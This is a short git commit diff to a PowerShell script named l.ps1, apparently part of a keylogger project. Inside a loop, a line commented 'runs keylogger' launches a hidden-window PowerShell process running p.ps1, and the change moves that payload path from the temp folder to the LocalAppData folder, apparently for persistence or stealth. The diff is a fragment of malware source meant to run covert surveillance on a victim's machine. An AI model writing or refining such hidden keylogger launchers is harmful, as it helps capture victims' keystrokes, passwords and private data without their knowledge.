70a11637a16e9952f6451da684ddb2eff2591008
JorgeRamnA69 <156077543+JorgeRamnA69@users.noreply.github.com>
2024-02-06 10:17:15 +0100

    Update l.ps1

--- l.ps1
+++ l.ps1
@@ -49,7 +49,7 @@ while ($true) {
             }
   
             # runs keylogger
-            powershell Start-Process powershell.exe -windowstyle hidden "$env:temp/p.ps1"
+            powershell Start-Process powershell.exe -windowstyle hidden "$env:LocalAppData\p.ps1"
         }
     }
 }
